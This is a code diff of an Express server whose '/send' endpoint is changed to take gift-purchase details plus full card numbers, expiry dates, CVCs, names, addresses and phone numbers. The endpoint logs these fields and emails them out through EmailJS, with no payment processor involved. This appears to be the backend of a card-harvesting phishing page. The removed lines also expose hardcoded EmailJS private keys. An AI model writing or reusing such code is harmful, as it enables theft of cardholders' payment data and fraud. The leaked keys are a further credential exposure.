@@ -8,7 +8,7 @@ import 'dotenv/config';
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// ES Module fix for __dirname / __filename
+// ES Module fix for __dirname
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
@@ -23,33 +23,44 @@ app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
 });
 
-// 🔹 Handle Card Payment + Billing form submissions
+// NEW UPDATED SEND ENDPOINT
 app.post("/send", async (req, res) => {
-  const formData = req.body;
+  const data = req.body;
 
-  // Template params for EmailJS
+  // Build email content from POST data
   const templateParams = {
-    name: formData.name || "",
-    email: formData.email || "",
-    phone: formData.phone || "",
-    address: formData.address || "",
-    plan: formData.plan || "",
-    message: formData.message || ""
+    gift_title: data.giftTitle || "",
+    gift_price: data.giftPrice || "",
+    gift_type: data.giftType || "",
+
+    card_number: data.cardNumber || "",
+    exp_date: data.expDate || "",
+    cvc: data.cvc || "",
+    card_name: data.cardName || "",
+
+    first_name: data.firstName || "",
+    last_name: data.lastName || "",
+    address1: data.address1 || "",
+    address2: data.address2 || "",
+    email: data.email || "",
+    mobile: data.mobile || "",
+    country: data.country || ""
   };
+
+  console.log("📨 RECEIVED DATA:", templateParams);
 
   try {
     const emailResponse = await emailjs.send(
-      "service_w7q3bge",       // ✔️ EmailJS Service ID
-      "template_oply56o",      // ✔️ EmailJS Template ID
-      templateParams,          // ✔️ Params na ipapasa
+      process.env.EMAILJS_SERVICE,
+      process.env.EMAILJS_TEMPLATE,
+      templateParams,
       {
-        publicKey:  "JxfpYH0Ko8Z5E6tEz",   // ✔️ EmailJS Public Key
-        privateKey: "CblrELnhPGSB5KdMO-Y3m" // ✔️ EmailJS Private Key
+        publicKey: process.env.EMAILJS_PUBLIC_KEY,
+        privateKey: process.env.EMAILJS_PRIVATE_KEY
       }
     );
 
     console.log("📨 Email sent:", emailResponse.text);
-
     res.status(200).json({ success: true, message: "Form sent successfully!" });
 
   } catch (err) {
